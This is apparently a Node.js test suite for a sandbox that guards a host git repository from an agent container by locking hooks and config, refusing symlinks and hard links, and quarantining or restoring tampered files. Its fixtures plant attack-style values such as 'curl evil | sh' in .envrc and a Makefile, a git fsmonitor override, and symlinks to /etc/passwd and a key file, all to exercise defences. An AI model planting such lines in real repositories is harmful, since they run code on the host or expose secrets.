import assert from 'node:assert/strict';
import fs from 'node:fs';
import path from 'node:path';
import { test } from 'node:test';
import {
  beginRun, clearPending, nameAliased, protectedMounts, setFileFlags, quarantineCreated, recordPending, restoreChanged, snapshotFiles, snapshotMissing, sweepRecord,
} from '../src/protect.js';
import { createExclusive, kind, realpathLoose, writeFileAtomic } from '../src/safefs.js';
import { tmp } from './helpers.js';

// Host git reads your global config too: keep the real one out of these tests.
process.env.HOME = tmp();
delete process.env.XDG_CONFIG_HOME;

function repo() {
  const root = tmp();
  fs.mkdirSync(path.join(root, '.git'));
  fs.writeFileSync(path.join(root, '.git', 'config'), '[core]\n');
  return root;
}

test('protectedMounts locks git hooks/config and creates .claude and .git/hooks', () => {
  const root = repo();
  fs.writeFileSync(path.join(root, '.mcp.json'), '{}');
  const { pinned, readOnly } = protectedMounts(root);
  assert.deepEqual(pinned, [path.join(root, '.git')]);
  assert.deepEqual(readOnly.sort(), ['.claude', '.git/config', '.git/hooks', '.mcp.json'].map((r) => path.join(root, r)).sort());
  assert.ok(fs.statSync(path.join(root, '.claude')).isDirectory());
});

test('protectedMounts refuses planted symlinks', () => {
  const root = repo();
  const secret = path.join(tmp(), 'id_rsa');
  fs.writeFileSync(secret, 'KEY');
  fs.rmSync(path.join(root, '.git', 'config'));
  fs.symlinkSync(secret, path.join(root, '.git', 'config'));
  assert.throws(() => protectedMounts(root), /symlink/);
});

test('protectedMounts refuses a .git/commondir redirect', () => {
  const root = repo();
  fs.writeFileSync(path.join(root, '.git', 'commondir'), '/elsewhere\n');
  assert.throws(() => protectedMounts(root), /commondir/);
});

test('files a pod creates that would run on the host are quarantined', () => {
  const root = repo();
  const missing = snapshotMissing(root);
  assert.ok(missing.includes('.mcp.json') && missing.includes('.envrc') && missing.includes('.git/commondir') && !missing.includes('.git'));
  fs.writeFileSync(path.join(root, '.envrc'), 'curl evil | sh');
  fs.symlinkSync('/etc/passwd', path.join(root, '.mcp.json'));
  const moved = quarantineCreated(root, missing);
  assert.equal(moved.length, 2);
  assert.ok(!fs.existsSync(path.join(root, '.envrc')));
  assert.ok(fs.readFileSync('/etc/passwd', 'utf8').length > 0, 'symlink target untouched');
});

test('writeFileAtomic and createExclusive never write through a planted symlink', () => {
  const dir = tmp();
  const target = path.join(tmp(), 'victim');
  fs.writeFileSync(target, 'ORIGINAL');
  fs.symlinkSync(target, path.join(dir, 'a'));
  writeFileAtomic(path.join(dir, 'a'), 'new');
  assert.equal(fs.readFileSync(target, 'utf8'), 'ORIGINAL');
  assert.equal(fs.readFileSync(path.join(dir, 'a'), 'utf8'), 'new');
  assert.equal(fs.statSync(path.join(dir, 'a')).mode & 0o777, 0o600);

  fs.symlinkSync(target, path.join(dir, 'b'));
  fs.closeSync(createExclusive(path.join(dir, 'b')));
  assert.equal(fs.readFileSync(target, 'utf8'), 'ORIGINAL');
});

test('realpathLoose resolves existing ancestors', () => {
  const dir = tmp();
  fs.mkdirSync(path.join(dir, 'real'));
  fs.symlinkSync(path.join(dir, 'real'), path.join(dir, 'link'));
  assert.equal(realpathLoose(path.join(dir, 'link', 'x', 'y')), path.join(dir, 'real', 'x', 'y'));
});

// A repo whose .git/config sets core.hooksPath to `value` (written raw, as git would read it).
function repoWithHooksPath(value) {
  const root = repo();
  fs.writeFileSync(path.join(root, '.git', 'config'), `[core]\n\thooksPath = ${value}\n`);
  return root;
}

test('core.hooksPath unset or empty adds nothing', () => {
  const base = protectedMounts(repo()).readOnly.length;
  assert.equal(protectedMounts(repoWithHooksPath('')).readOnly.length, base);
});

test('core.hooksPath inside the project is locked read-only, and created if missing', () => {
  const rel = repoWithHooksPath('.githooks/');
  fs.mkdirSync(path.join(rel, '.githooks'));
  assert.ok(protectedMounts(rel).readOnly.includes(path.join(rel, '.githooks')));

  const root = repo();
  const abs = path.join(root, 'tools', 'hooks');
  fs.writeFileSync(path.join(root, '.git', 'config'), `[core]\n\thooksPath = ${abs}\n`);
  assert.ok(protectedMounts(root).readOnly.includes(abs));
  assert.ok(fs.statSync(abs).isDirectory(), 'created');
});

test('core.hooksPath pointing at .git/hooks or inside .claude is not mounted twice', () => {
  const base = protectedMounts(repo()).readOnly.length;
  for (const value of ['.git/hooks', '.claude/hooks']) {
    const { readOnly } = protectedMounts(repoWithHooksPath(value));
    assert.equal(readOnly.length, base, value);
  }
});

test('an include that points into the project is refused, wherever it is spelled', () => {
  for (const [section, value] of [['include', 'INC'], ['includeIf "gitdir:~/my work/"', '../inc'], ['include', 'config.local']]) {
    const root = repo();
    fs.writeFileSync(path.join(root, '.git', 'config'), `[${section}]\n\tpath = ${value}\n`);
    assert.throws(() => protectedMounts(root), /includes .*inside the project/, value);
  }
  // A symlink in the project that points out can still be repointed by the pod.
  const link = repo();
  fs.symlinkSync(tmp(), path.join(link, 'gitdir'));
  fs.writeFileSync(path.join(link, '.git', 'config'), `[include]\n\tpath = ${path.join(link, 'gitdir', 'x')}\n`);
  assert.throws(() => protectedMounts(link), /inside the project/);
});

test('includes outside the project, or under a readOnly folder, are followed for core.hooksPath', () => {
  const root = repo();
  const outside = tmp();
  fs.writeFileSync(path.join(outside, 'a'), `[include]\n\tpath = b\n`); // relative to a's folder
  fs.writeFileSync(path.join(outside, 'b'), '[core]\n\thooksPath = .husky\n');
  fs.mkdirSync(path.join(root, 'conf'));
  fs.writeFileSync(path.join(root, 'conf', 'git'), '[core]\n\thooksPath = tools/hooks\n');
  fs.writeFileSync(path.join(root, '.git', 'config'), `[includeIf "onbranch:main"]\n\tpath = ${path.join(outside, 'a')}\n[include]\n\tpath = ../conf/git\n`);
  const { readOnly } = protectedMounts(root, ['conf']);
  for (const rel of ['.husky', 'tools/hooks', 'conf']) assert.ok(readOnly.includes(path.join(root, rel)), rel);
  // An include cycle ends.
  fs.writeFileSync(path.join(outside, 'b'), `[include]\n\tpath = a\n`);
  assert.doesNotThrow(() => protectedMounts(root, ['conf']));
});

test('core.hooksPath in .git/config.worktree is locked too', () => {
  const root = repo();
  fs.writeFileSync(path.join(root, '.git', 'config.worktree'), '[core]\n\thooksPath = .wt-hooks\n');
  assert.ok(protectedMounts(root).readOnly.includes(path.join(root, '.wt-hooks')));
});

test('in a monorepo subfolder, the repo above is read for core.hooksPath', () => {
  const top = repo();
  const root = path.join(top, 'apps', 'web');
  fs.mkdirSync(root, { recursive: true });
  fs.writeFileSync(path.join(top, '.git', 'config'), '[core]\n\thooksPath = apps/web/.githooks\n');
  const { readOnly } = protectedMounts(root);
  assert.ok(readOnly.includes(path.join(root, '.githooks')), readOnly.join(','));
  // Hooks at the top of the repo are outside every pod: nothing to lock, nothing to refuse.
  fs.writeFileSync(path.join(top, '.git', 'config'), '[core]\n\thooksPath = .githooks\n');
  assert.doesNotThrow(() => protectedMounts(root));
  assert.ok(!fs.existsSync(path.join(top, '.githooks')), 'not created above the project');
  // Outside the repo too: the repo above (a home-folder dotfiles repo, say) is not this project's.
  fs.writeFileSync(path.join(top, '.git', 'config'), `[core]\n\thooksPath = ${tmp()}\n`);
  assert.doesNotThrow(() => protectedMounts(root));
  fs.writeFileSync(path.join(top, '.git', 'config'), '[include]\n\tpath = ../apps/web/inc\n');
  assert.throws(() => protectedMounts(root), /inside the project/);
});

test('a protected file with a second hard link is refused', () => {
  const root = repo();
  fs.linkSync(path.join(root, '.git', 'config'), path.join(root, 'twin'));
  assert.throws(() => protectedMounts(root), /2 hard links/);
  const extra = repo();
  fs.writeFileSync(path.join(extra, 'Makefile'), '');
  fs.linkSync(path.join(extra, 'Makefile'), path.join(extra, 'twin'));
  assert.throws(() => protectedMounts(extra, ['Makefile']), /hard links/);
});

test('core.hooksPath that is a symlink, or goes through one, is refused', () => {
  const outside = tmp();
  const root = repoWithHooksPath('.githooks');
  fs.symlinkSync(outside, path.join(root, '.githooks'));
  assert.throws(() => protectedMounts(root), /\.githooks is a symlink/);

  const nested = repoWithHooksPath('tools/hooks');
  fs.symlinkSync(outside, path.join(nested, 'tools'));
  assert.throws(() => protectedMounts(nested), /tools is a symlink/);
  assert.ok(!fs.existsSync(path.join(outside, 'hooks')), 'nothing created through the symlink');

  const file = repoWithHooksPath('.githooks');
  fs.writeFileSync(path.join(file, '.githooks'), '');
  assert.throws(() => protectedMounts(file), /is a file, not a dir/);
});

test('core.hooksPath outside the project, the project itself, or .git is refused', () => {
  const outside = tmp();
  for (const value of [outside, '../elsewhere', '~/hooks']) {
    assert.throws(() => protectedMounts(repoWithHooksPath(value)), /outside the project/, value);
  }
  assert.throws(() => protectedMounts(repoWithHooksPath('.')), /whole project read-only/);
  assert.throws(() => protectedMounts(repoWithHooksPath('.git/')), /whole \.git folder read-only/);
  // Creating it would make a watched path (never quarantined afterwards).
  assert.throws(() => protectedMounts(repoWithHooksPath('.vscode/hooks')), /inside \.vscode, which is missing/);
});

test('an unreadable .git/config refuses to start', () => {
  const root = repo();
  fs.writeFileSync(path.join(root, '.git', 'config'), 'garbage[[\n');
  assert.throws(() => protectedMounts(root), /Could not read core\.hooksPath/);
});

test('.git/config.worktree is locked when present and quarantined when a pod creates it', () => {
  const root = repo();
  assert.ok(snapshotMissing(root).includes('.git/config.worktree'));
  fs.writeFileSync(path.join(root, '.git', 'config.worktree'), '[core]\n');
  assert.ok(protectedMounts(root).readOnly.includes(path.join(root, '.git', 'config.worktree')));
  const planted = repo();
  const missing = snapshotMissing(planted);
  fs.writeFileSync(path.join(planted, '.git', 'config.worktree'), '[core]\n\thooksPath = evil\n');
  assert.equal(quarantineCreated(planted, missing).length, 1);
  assert.ok(!fs.existsSync(path.join(planted, '.git', 'config.worktree')));
});

test('readOnly: existing files and dirs are mounted read-only; missing ones are watched', () => {
  const root = repo();
  fs.mkdirSync(path.join(root, 'scripts'));
  fs.writeFileSync(path.join(root, 'package.json'), '{}');
  fs.mkdirSync(path.join(root, 'infra'));
  const extra = ['scripts', 'package.json', 'infra/prod.sh', 'Makefile', 'deploy/run.sh', '.claude/settings.json'];
  const { readOnly } = protectedMounts(root, extra);
  for (const rel of ['scripts', 'package.json']) assert.ok(readOnly.includes(path.join(root, rel)), rel);
  for (const rel of ['infra/prod.sh', 'Makefile', 'deploy', 'deploy/run.sh', '.claude/settings.json']) {
    assert.ok(!readOnly.includes(path.join(root, rel)), rel);
  }
  const missing = snapshotMissing(root, extra);
  // A missing folder is recorded at the top, not the file under it.
  for (const rel of ['infra/prod.sh', 'Makefile', 'deploy']) assert.ok(missing.includes(rel), rel);
  assert.ok(!missing.includes('deploy/run.sh') && !missing.includes('scripts'));
});

test('readOnly: symlinks, outside paths and non-dirs on the way are refused', () => {
  const outside = tmp();
  fs.writeFileSync(path.join(outside, 'secret'), 'KEY');
  const link = repo();
  fs.symlinkSync(path.join(outside, 'secret'), path.join(link, 'package.json'));
  assert.throws(() => protectedMounts(link, ['package.json']), /symlink/);
  const parent = repo();
  fs.symlinkSync(outside, path.join(parent, 'scripts'));
  assert.throws(() => protectedMounts(parent, ['scripts/secret']), /symlink/);
  const file = repo();
  fs.writeFileSync(path.join(file, 'scripts'), '');
  assert.throws(() => protectedMounts(file, ['scripts/deploy.sh']), /is a file, not a dir/);
});

test('readOnly: what a pod creates is quarantined, never through a planted symlink', () => {
  const root = repo();
  const extra = ['scripts/deploy.sh', 'Makefile'];
  fs.mkdirSync(path.join(root, 'scripts'));
  const missing = snapshotMissing(root, extra);
  fs.writeFileSync(path.join(root, 'Makefile'), 'all:\n\tcurl evil | sh\n');
  // The pod swaps scripts/ for a symlink to a host folder holding a deploy.sh.
  const host = tmp();
  fs.writeFileSync(path.join(host, 'deploy.sh'), 'HOST FILE');
  fs.rmSync(path.join(root, 'scripts'), { recursive: true });
  fs.symlinkSync(host, path.join(root, 'scripts'));
  const moved = quarantineCreated(root, missing);
  assert.equal(moved.length, 2);
  assert.ok(!fs.existsSync(path.join(root, 'Makefile')));
  assert.equal(kind(path.join(root, 'scripts')), 'missing', 'the symlink itself was renamed');
  assert.ok(moved.some((m) => path.basename(m).startsWith('scripts.claude-pod-quarantine-')));
  assert.equal(fs.readFileSync(path.join(host, 'deploy.sh'), 'utf8'), 'HOST FILE', 'host file not moved');
  assert.deepEqual(fs.readdirSync(host), ['deploy.sh']);
});

test('readOnly: folders above a locked path are pinned so they cannot be renamed away', () => {
  const root = repo();
  fs.mkdirSync(path.join(root, 'scripts', 'ci'), { recursive: true });
  fs.writeFileSync(path.join(root, 'scripts', 'ci', 'deploy.sh'), '');
  fs.mkdirSync(path.join(root, 'infra'));
  fs.mkdirSync(path.join(root, 'tools'));
  const { pinned, readOnly } = protectedMounts(root, ['scripts/ci/deploy.sh', 'infra/prod.sh', 'tools', 'tools/x.sh']);
  for (const rel of ['.git', 'scripts', 'scripts/ci', 'infra']) assert.ok(pinned.includes(path.join(root, rel)), rel);
  assert.ok(!pinned.includes(path.join(root, 'tools')), 'a read-only folder is not also pinned');
  assert.ok(readOnly.includes(path.join(root, 'scripts', 'ci', 'deploy.sh')));
  assert.ok(readOnly.includes(path.join(root, 'tools')) && !readOnly.includes(path.join(root, 'tools', 'x.sh')), 'nested read-only mount dropped');
});

test('a nested core.hooksPath has its parent folders pinned, including ones it creates', () => {
  const root = repo();
  fs.writeFileSync(path.join(root, '.git', 'config'), '[core]\n\thooksPath = tools/git/hooks\n');
  const { pinned, readOnly } = protectedMounts(root);
  assert.ok(readOnly.includes(path.join(root, 'tools', 'git', 'hooks')));
  for (const rel of ['tools', 'tools/git']) assert.ok(pinned.includes(path.join(root, rel)), rel);
});

test('readOnly entries inside a read-only mount are not watched, so host-made files stay', () => {
  const root = repo();
  const extra = ['.claude/settings.local.json', 'Makefile'];
  const { readOnly } = protectedMounts(root, extra);
  const missing = snapshotMissing(root, extra, readOnly);
  assert.ok(missing.includes('Makefile'));
  assert.ok(!missing.includes('.claude/settings.local.json'));
});

test('in a worktree (.git is a file) nothing under .git is watched, and .git is never renamed', () => {
  const root = tmp();
  fs.writeFileSync(path.join(root, '.git'), 'gitdir: /elsewhere/.git/worktrees/x\n');
  const missing = snapshotMissing(root);
  assert.ok(!missing.some((r) => r.startsWith('.git')), missing.join(','));
  // Even given an old record that lists one, a file on the way is not treated as planted.
  assert.deepEqual(quarantineCreated(root, ['.git/commondir']), []);
  assert.equal(kind(path.join(root, '.git')), 'file');
});

test('readOnly paths spelled in another case land on the same mount (case-insensitive file systems)', (t) => {
  const root = repo();
  fs.mkdirSync(path.join(root, 'scripts', 'ci'), { recursive: true });
  fs.writeFileSync(path.join(root, 'scripts', 'ci', 'deploy.sh'), '');
  if (kind(path.join(root, 'SCRIPTS')) === 'missing') return t.skip('case-sensitive file system');
  const { pinned, readOnly } = protectedMounts(root, ['SCRIPTS', 'scripts/ci/deploy.sh', '.CLAUDE/x']);
  assert.deepEqual(readOnly.filter((m) => m.toLowerCase().includes('scripts')), [path.join(root, 'scripts')]);
  assert.ok(!pinned.some((p) => p.toLowerCase().includes('scripts') || p.toLowerCase().includes('.claude')), pinned.join(','));
});

test('a missing folder above a readOnly entry is quarantined under a message naming the entry', (t) => {
  const root = repo();
  const missing = snapshotMissing(root, ['infra/prod.sh']);
  fs.mkdirSync(path.join(root, 'infra'));
  const warnings = [];
  t.mock.method(process.stderr, 'write', (m) => { warnings.push(String(m)); return true; });
  quarantineCreated(root, missing, ['infra/prod.sh']);
  t.mock.restoreAll();
  assert.match(warnings.join(''), /created infra\/ \(which holds infra\/prod\.sh, listed in "readOnly"\)/);
});

// Read-only files on a case-insensitive file system: snapshot at launch, put back after the run.
// These run under a throwaway HOME, since the copies live in host-only state.
function withHome(t) {
  const prev = process.env.HOME;
  process.env.HOME = tmp();
  t.after(() => { process.env.HOME = prev; });
}
const always = () => true;
const quiet = (t) => t.mock.method(process.stderr, 'write', () => true);

test('nameAliased tells a case-insensitive file system from a case-sensitive one', (t) => {
  const dir = tmp();
  fs.writeFileSync(path.join(dir, 'config'), '');
  const insensitive = kind(path.join(dir, 'CONFIG')) !== 'missing';
  assert.equal(nameAliased(path.join(dir, 'config')), insensitive);
  fs.writeFileSync(path.join(dir, '123'), '');
  if (process.platform !== 'darwin' || !insensitive) return;
  assert.equal(nameAliased(path.join(dir, '123')), false, 'no letters, no other spelling');
});

test('a read-only file changed during the run is put back, and the changed one kept', (t) => {
  withHome(t);
  quiet(t);
  const root = repo();
  const config = path.join(root, '.git', 'config');
  const script = path.join(root, 'deploy.sh');
  fs.writeFileSync(script, 'echo deploy\n', { mode: 0o755 });
  fs.chmodSync(script, 0o755);
  const files = snapshotFiles(root, [config, script, path.join(root, '.claude')], 'pod-a', always);
  assert.equal(files.length, 2, 'folders are not snapshotted');
  assert.deepEqual(restoreChanged(root, files), [], 'unchanged: nothing to do');

  fs.appendFileSync(config, '[core]\n\tfsmonitor = evil\n');
  fs.rmSync(script);
  fs.symlinkSync('/etc/passwd', script);
  assert.deepEqual(restoreChanged(root, files).sort(), [config, script].sort());
  assert.equal(fs.readFileSync(config, 'utf8'), '[core]\n');
  assert.equal(kind(script), 'file');
  assert.equal(fs.statSync(script).mode & 0o777, 0o755, 'mode restored');
  const kept = fs.readdirSync(path.join(root, '.git')).filter((f) => f.startsWith('config.claude-pod-quarantine-'));
  assert.equal(kept.length, 1);
  assert.match(fs.readFileSync(path.join(root, '.git', kept[0]), 'utf8'), /fsmonitor = evil/);
  assert.ok(fs.readFileSync('/etc/passwd', 'utf8').length > 0, 'symlink target untouched');
});

test('a deleted, hard-linked or chmod-ed read-only file is put back', (t) => {
  withHome(t);
  quiet(t);
  const root = repo();
  const p = path.join(root, '.mcp.json');
  fs.writeFileSync(p, '{}');
  fs.chmodSync(p, 0o644);
  const files = snapshotFiles(root, [p], 'pod-b', always);
  fs.rmSync(p);
  assert.deepEqual(restoreChanged(root, files), [p]);
  assert.equal(fs.readFileSync(p, 'utf8'), '{}');
  fs.linkSync(p, path.join(root, 'twin'));
  assert.deepEqual(restoreChanged(root, files), [p]);
  assert.equal(fs.lstatSync(p).nlink, 1);
  fs.chmodSync(p, 0o4755);
  assert.deepEqual(restoreChanged(root, files), [p]);
  assert.equal(fs.statSync(p).mode & 0o7777, 0o644);
});

test('nothing is written through a parent folder swapped for a symlink, or from a bad record', (t) => {
  withHome(t);
  quiet(t);
  const root = repo();
  fs.mkdirSync(path.join(root, 'scripts'));
  const p = path.join(root, 'scripts', 'x.sh');
  fs.writeFileSync(p, 'ok');
  const files = snapshotFiles(root, [p], 'pod-c', always);
  const host = tmp();
  fs.renameSync(path.join(root, 'scripts'), path.join(root, 'old'));
  fs.symlinkSync(host, path.join(root, 'scripts'));
  assert.deepEqual(restoreChanged(root, files), []);
  assert.deepEqual(fs.readdirSync(host), []);
  // Paths outside the project, or a backup outside host-only state, are ignored.
  const outside = path.join(tmp(), 'victim');
  fs.writeFileSync(outside, 'mine');
  assert.deepEqual(restoreChanged(root, [{ ...files[0], path: outside }]), []);
  assert.deepEqual(restoreChanged(root, [{ ...files[0], backup: outside }]), []);
  assert.equal(fs.readFileSync(outside, 'utf8'), 'mine');
});

test('a second pod takes the first one\'s launch copy, not a version the first pod changed', (t) => {
  withHome(t);
  quiet(t);
  const root = repo();
  const config = path.join(root, '.git', 'config');
  const a = snapshotFiles(root, [config], 'pod-1', always);
  recordPending(root, 'pod-1', [], { files: a });
  fs.writeFileSync(config, '[core]\n\tfsmonitor = evil\n'); // pod 1 writes it through .git/CONFIG
  const b = snapshotFiles(root, [config], 'pod-2', always);
  recordPending(root, 'pod-2', [], { files: b });
  assert.equal(b[0].sha256, a[0].sha256);
  sweepRecord('pod-2'); // pod 2 ends first
  assert.equal(fs.readFileSync(config, 'utf8'), '[core]\n');
  clearPending('pod-1');
  assert.ok(!fs.existsSync(path.dirname(a[0].backup)), 'copies removed with the record');
});

test('sweepRecord puts back changed files for a launcher that died', (t) => {
  withHome(t);
  quiet(t);
  const root = repo();
  const config = path.join(root, '.git', 'config');
  const files = snapshotFiles(root, [config], 'pod-x', always);
  recordPending(root, 'pod-x', [], { files });
  fs.writeFileSync(config, 'evil');
  sweepRecord('pod-x');
  assert.equal(fs.readFileSync(config, 'utf8'), '[core]\n');
});

test('on a case-sensitive file system nothing is snapshotted', (t) => {
  withHome(t);
  const root = repo();
  assert.deepEqual(snapshotFiles(root, [path.join(root, '.git', 'config')], 'pod-s', () => false), []);
});

// A stand-in for chflags: a set of locked paths, so tests never leave undeletable files.
function fakeFlags(t, { fail = [] } = {}) {
  const set = new Set();
  const impl = {
    supported: true,
    set,
    locked: (p) => set.has(p),
    lock: (p) => !fail.includes(p) && !!set.add(p),
    unlock: (p) => set.delete(p) || true,
  };
  const prev = setFileFlags(impl);
  t.after(() => setFileFlags(prev));
  return impl;
}

test('beginRun locks read-only files once for all pods; the last pod to end unlocks them', (t) => {
  withHome(t);
  quiet(t);
  const f = fakeFlags(t);
  const root = repo();
  const config = path.join(root, '.git', 'config');
  if (!nameAliased(config)) return t.skip('case-sensitive file system: nothing to lock');
  const a = beginRun(root, 'pod-a', { missing: [], readOnly: [config], extra: [] });
  assert.deepEqual(a.locked, [config]);
  assert.ok(f.set.has(config));
  const b = beginRun(root, 'pod-b', { missing: [], readOnly: [config], extra: [] });
  assert.deepEqual(b.locked, [config], 'held by both');
  sweepRecord('pod-a');
  assert.ok(f.set.has(config), 'pod-b still runs');
  sweepRecord('pod-b');
  assert.ok(!f.set.has(config), 'unlocked by the last one');
});

test('beginRun leaves a file you made immutable yourself, and refuses when it cannot lock', (t) => {
  withHome(t);
  quiet(t);
  const root = repo();
  const config = path.join(root, '.git', 'config');
  const mcp = path.join(root, '.mcp.json');
  fs.writeFileSync(mcp, '{}');
  if (!nameAliased(config)) return t.skip('case-sensitive file system: nothing to lock');
  const f = fakeFlags(t, { fail: [mcp] });
  f.set.add(config); // yours
  assert.throws(() => beginRun(root, 'pod-a', { missing: [], readOnly: [config, mcp], extra: [] }), /Could not make .*\.mcp\.json immutable/);
  assert.ok(f.set.has(config), 'still yours');
  assert.equal(kind(path.join(process.env.HOME, '.config', 'claude-pod', 'pending', 'pod-a.json')), 'missing', 'no record left');
  f.set.delete(config);
  const run = beginRun(root, 'pod-b', { missing: [], readOnly: [config], extra: [] });
  assert.deepEqual(run.locked, [config]);
  sweepRecord('pod-b');
});

test('a file another running pod found missing is not taken as yours by a second pod', (t) => {
  withHome(t);
  quiet(t);
  const f = fakeFlags(t);
  const root = repo();
  const mcp = path.join(root, '.mcp.json');
  beginRun(root, 'pod-a', { missing: snapshotMissing(root), readOnly: [], extra: [] });
  fs.writeFileSync(mcp, '{"mcpServers":{"x":{"command":"evil"}}}'); // pod A plants it
  const b = beginRun(root, 'pod-b', { missing: snapshotMissing(root), readOnly: protectedMounts(root).readOnly, extra: [] });
  assert.ok(b.missing.includes('.mcp.json'), 'pod B quarantines it too');
  assert.ok(!b.files.some((x) => x.path === mcp) && !f.set.has(mcp), 'neither copied nor locked');
  sweepRecord('pod-a');
  sweepRecord('pod-b');
  assert.equal(kind(mcp), 'missing', 'quarantined, not put back');
});

test('a folder at a predictable quarantine name does not stop the restore', (t) => {
  withHome(t);
  quiet(t);
  const root = repo();
  const config = path.join(root, '.git', 'config');
  const files = snapshotFiles(root, [config], 'pod-q', always);
  fs.writeFileSync(config, '[core]\n\tfsmonitor = evil\n');
  const stamp = new Date().toISOString().replace(/[:.]/g, '-');
  fs.mkdirSync(path.join(root, '.git', `config.claude-pod-quarantine-${stamp}`, 'x'), { recursive: true });
  assert.deepEqual(restoreChanged(root, files), [config]);
  assert.equal(fs.readFileSync(config, 'utf8'), '[core]\n');
});

test('in a linked worktree, the .git file is locked and the main repo config is read', () => {
  const main = repo();
  const wt = tmp();
  const gitDir = path.join(main, '.git', 'worktrees', 'wt');
  fs.mkdirSync(gitDir, { recursive: true });
  fs.writeFileSync(path.join(gitDir, 'commondir'), '../..\n');
  fs.writeFileSync(path.join(wt, '.git'), `gitdir: ${gitDir}\n`);
  fs.writeFileSync(path.join(main, '.git', 'config'), '[core]\n\thooksPath = .husky/_\n');
  const { readOnly } = protectedMounts(wt);
  assert.ok(readOnly.includes(path.join(wt, '.git')), 'the .git file');
  assert.ok(readOnly.includes(path.join(wt, '.husky', '_')), readOnly.join(','));
  // A .git file pointing into the project would let the pod write its hooks.
  const inside = tmp();
  fs.mkdirSync(path.join(inside, '.bare'));
  fs.writeFileSync(path.join(inside, '.git'), 'gitdir: ./.bare\n');
  assert.throws(() => protectedMounts(inside), /inside the project/);
});

test('a relative core.hooksPath in your global git config is locked inside the project', (t) => {
  const prev = process.env.HOME;
  process.env.HOME = tmp();
  t.after(() => { process.env.HOME = prev; });
  fs.writeFileSync(path.join(process.env.HOME, '.gitconfig'), '[core]\n\thooksPath = .githooks\n');
  const root = repo();
  assert.ok(protectedMounts(root).readOnly.includes(path.join(root, '.githooks')));
  // An absolute global hooks folder outside the project is yours: not refused.
  fs.writeFileSync(path.join(process.env.HOME, '.gitconfig'), `[core]\n\thooksPath = ${tmp()}\n`);
  assert.doesNotThrow(() => protectedMounts(repo()));
});

test('an include spelled in another case is still seen as inside the project', (t) => {
  const root = repo();
  if (kind(root.toUpperCase()) === 'missing') return t.skip('case-sensitive file system');
  fs.writeFileSync(path.join(root, '.git', 'config'), `[include]\n\tpath = ${root.toUpperCase()}/tools/git.inc\n`);
  assert.throws(() => protectedMounts(root), /inside the project/);
});

test('a file another record claims is locked again if you unlocked it since', (t) => {
  withHome(t);
  quiet(t);
  const f = fakeFlags(t);
  const root = repo();
  const config = path.join(root, '.git', 'config');
  if (!nameAliased(config)) return t.skip('case-sensitive file system: nothing to lock');
  beginRun(root, 'pod-a', { missing: [], readOnly: [config], extra: [] });
  f.set.delete(config); // `chflags nouchg` by hand, pod-a's record still there
  beginRun(root, 'pod-b', { missing: [], readOnly: [config], extra: [] });
  assert.ok(f.set.has(config));
  sweepRecord('pod-a');
  sweepRecord('pod-b');
  assert.ok(!f.set.has(config));
});

test('global git config: GIT_CONFIG_GLOBAL is read, and a value under a missing .vscode is left to quarantine', (t) => {
  const g = path.join(tmp(), 'gitconfig');
  fs.writeFileSync(g, '[core]\n\thooksPath = .vscode/hooks\n');
  const prev = process.env.GIT_CONFIG_GLOBAL;
  process.env.GIT_CONFIG_GLOBAL = g;
  t.after(() => { if (prev === undefined) delete process.env.GIT_CONFIG_GLOBAL; else process.env.GIT_CONFIG_GLOBAL = prev; });
  const root = repo();
  assert.doesNotThrow(() => protectedMounts(root));
  assert.equal(kind(path.join(root, '.vscode')), 'missing');
  fs.writeFileSync(g, '[core]\n\thooksPath = .githooks\n');
  assert.ok(protectedMounts(root).readOnly.includes(path.join(root, '.githooks')));
});
